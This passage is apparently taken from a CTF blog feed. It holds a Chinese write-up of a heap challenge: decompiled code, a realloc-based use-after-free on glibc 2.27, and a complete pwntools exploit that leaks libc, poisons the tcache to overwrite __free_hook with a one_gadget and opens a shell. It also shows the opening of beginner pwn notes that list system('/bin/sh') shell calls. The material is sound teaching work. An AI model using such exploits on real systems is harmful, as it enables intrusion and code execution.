    <content type="html"><![CDATA[<p>视频版：<a href="https://www.bilibili.com/video/BV1p8BoYPEae">https://www.bilibili.com/video/BV1p8BoYPEae</a></p><p>程序使用<code>rand</code>函数模拟洗牌，同时可以通过程序设置、获取卡牌信息，也可以重新初始化或进行随机，考察点是<code>2.27</code>使用<code>realloc</code>造成的<code>uaf</code>，同时在管理结构中存在<code>get</code>功能的函数指针，攻击思路就是利用<code>uaf</code>修改函数指针为<code>ogg</code>从而<code>getshell</code></p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="init-card"><a href="#init-card" class="headerlink" title="init_card"></a>init_card</h3><p>初始化卡牌，创建了<code>card_manager</code>和<code>heap_manager</code>并进行相关初始化</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_QWORD <span class="token operator">*</span><span class="token function">init_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>current_heap<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-1Ch]</span>  manager <span class="token operator">*</span>card_manager<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>  card_manager <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_manager <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>index <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    current_heap <span class="token operator">=</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>current_heap <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xD0uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10LL</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> index<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 1-13</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  card_manager<span class="token operator">-></span>card_len <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_size <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>card <span class="token operator">=</span> card<span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>func <span class="token operator">=</span> output_func<span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>random_level <span class="token operator">=</span> <span class="token number">0x3E8LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>card_len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>card_manager</code>的结构体如下，存在<code>card</code>、<code>func</code>、<code>heap_manager</code>三个指针和<code>card_len</code>、<code>heap_size</code>、<code>random_level</code>三个参数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">00000000</span> <span class="token keyword">struct</span> <span class="token class-name">manager</span> <span class="token comment">// sizeof=0x28</span><span class="token number">00000000</span> <span class="token punctuation">&#123;</span><span class="token number">00000000</span>     <span class="token keyword">unsigned</span> __int32 card_len<span class="token punctuation">;</span><span class="token number">00000004</span>     <span class="token keyword">unsigned</span> __int32 heap_size<span class="token punctuation">;</span><span class="token number">00000008</span>     <span class="token keyword">unsigned</span> __int64 random_level<span class="token punctuation">;</span><span class="token number">00000010</span>     <span class="token keyword">unsigned</span> __int64 card<span class="token punctuation">;</span><span class="token number">00000018</span>     <span class="token keyword">unsigned</span> __int64 func<span class="token punctuation">;</span><span class="token number">00000020</span>     <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>heap_manager<span class="token punctuation">;</span><span class="token number">00000028</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>card</code>指针指向的地址中存在卡牌的所有花色，花色的种类数量是<code>card_len</code>，初始值为<code>4</code>，初始花色是<code>data</code>段的<code>♥♠♦♣</code></li><li><code>heap_manager</code>指向堆管理地址，保存了卡牌的位置和花色，初始堆的数量是<code>13</code>，每个堆的大小等于<code>heap_size * 0x10</code></li><li><code>random_level</code>设置了随机化等级，在后续随机化函数会用到，初始值为<code>0x3e8</code></li><li><code>func</code>指向一个输出函数，初始值是程序段的<code>output_func</code></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">output_func</span><span class="token punctuation">(</span>manager <span class="token operator">*</span>manager<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count is %d\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range: 1 - %d\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit chara set:%s\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>card<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:%lld\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>random_level<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><code>set</code>函数由用户自定义了卡牌信息</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> __fastcall <span class="token function">set</span><span class="token punctuation">(</span>manager <span class="token operator">*</span>card_manager<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>current_heap<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">signed</span> __int32 i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>card_address<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> card_manager<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range 1 - ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>random_level<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> card_manager<span class="token operator">-></span>card <span class="token operator">==</span> card <span class="token punctuation">)</span>    card_address <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    card_address <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>card<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_manager <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>index <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">>=</span> result <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    current_heap <span class="token operator">=</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>current_heap <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16LL</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> index<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> card_address <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    card_manager<span class="token operator">-></span>card <span class="token operator">=</span> card_address<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"new suite set:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> card_manager<span class="token operator">-></span>card<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>由用户输入了<code>card_len</code>、<code>heap_size</code>、<code>random_level</code></li><li>创建<code>card</code>堆块<ul><li>当前<code>card_manager</code>中的<code>card</code>值与<code>data</code>段的<code>card</code>值相同的时候使用<code>malloc</code>创建长度为<code>4 * card_len</code>的<code>card</code>堆块</li><li>不同的时候使用<code>realloc</code>调整堆块的大小为<code>4 * card_len</code></li></ul></li><li>使用<code>realloc</code>调整堆管理结构大小为<code>8 * card_len</code></li><li>循环创建数量为<code>card_len</code>的堆块，堆块大小为输入的<code>heap_size</code>，并且在堆块中存放位置和花色</li><li>设置<code>card_manager</code>中的<code>card</code>的地址为创建的<code>card</code>堆块地址</li></ul><p>其中<code>realloc</code>在<code>card_len</code>为<code>0</code>的时候存在<code>uaf</code>漏洞</p><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>该功能调用的<code>card_manager</code>中的<code>func</code>函数对堆中的内容进行输出，包括<code>card_len</code>、<code>heap_size</code>、<code>card</code>内容、<code>random_level</code>，其中<code>card</code>可修改为堆指针，存在内存泄露</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                                   <span class="token comment">// get</span>        <span class="token punctuation">(</span>card_manager<span class="token operator">-></span>func<span class="token punctuation">)</span><span class="token punctuation">(</span>card_manager<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h2><p>在<code>set</code>的时候控制堆大小进而控制<code>card</code>为一个大堆块，再将<code>size</code>设置为<code>0</code>释放后进入<code>unsorted bin</code>，通过<code>get</code>函数泄露出<code>libc</code>地址，再进行<code>tcache bin attack</code>，当<code>calloc</code>的<code>size</code>和堆大小相同时相当于<code>edit</code>，利用这一点改<code>tcache bin</code>中的地址为<code>free_hook</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'173.41.49.110'</span><span class="token punctuation">,</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_content</span><span class="token punctuation">(</span>card_size<span class="token punctuation">,</span> heap_size<span class="token punctuation">,</span> level<span class="token punctuation">,</span> card<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'count'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>card_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'range'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>heap_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'level'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>level<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> card<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'set'</span><span class="token punctuation">,</span> card<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebc61</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27-3/libc-2.27.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseset_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频版：&lt;a href=&quot;https://www.bilibili.com/video/BV1p8BoYPEae&quot;&gt;https://www.bilibili.com/video/BV1p8BoYPEae&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;程序使用&lt;code&gt;rand&lt;/code&gt;函数模</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>《重生之我在yctu做pwn手》系列视频笔记</title>
    <link href="https://starrysky1004.github.io/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/"/>
    <id>https://starrysky1004.github.io/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/</id>
    <published>2024-11-06T07:41:19.214Z</published>
    <updated>2024-12-04T08:45:34.573Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-pwn环境配置"><a href="#1-pwn环境配置" class="headerlink" title="1.pwn环境配置"></a>1.pwn环境配置</h2><p>视频讲解：<a href="https://www.bilibili.com/video/BV1YT1oYeEVd">https://www.bilibili.com/video/BV1YT1oYeEVd</a></p><p>配置指令：<a href="https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/">https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/</a></p><h2 id="2-基础知识-amp-ret2text"><a href="#2-基础知识-amp-ret2text" class="headerlink" title="2.基础知识 &amp; ret2text"></a>2.基础知识 &amp; ret2text</h2><h3 id="PWN解题目标"><a href="#PWN解题目标" class="headerlink" title="PWN解题目标"></a>PWN解题目标</h3><p>获取远程靶机里的<code>flag</code>文件中的字符串（<code>flag</code>是<strong>动态</strong>的，每个队伍的<code>flag</code>不同）</p><ul><li><p>获取<code>shell</code>：和远程终端交互通过<code>cat flag</code>获取</p><p>可以获取<code>shell</code>的函数：**<code>system(&#39;/bin/sh&#39;)</code>**<code>system(&#39;sh&#39;)</code><code>system(&#39;$0&#39;)</code></p><p>ps:读的是远程的<code>flag</code>文件，本地可以用<code>ls</code>确认是否获得<code>shell</code>或创建一个<code>flag</code>文件</p></li><li><p>读取<code>flag</code>（<code>open read write</code>）&#x2F; <code>system(&#39;cat flag&#39;)</code></p></li></ul><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">char</span> hello<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello world!"</span><span class="token punctuation">;</span><span class="token keyword">int</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> res<span class="token punctuation">;</span>        res <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>        c <span class="token operator">=</span> <span class="token function">func</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Result is: %d"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><p>在终端直接与远程程序交互：<code>nc ip port</code></p><h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h5><p>参考文章：<a 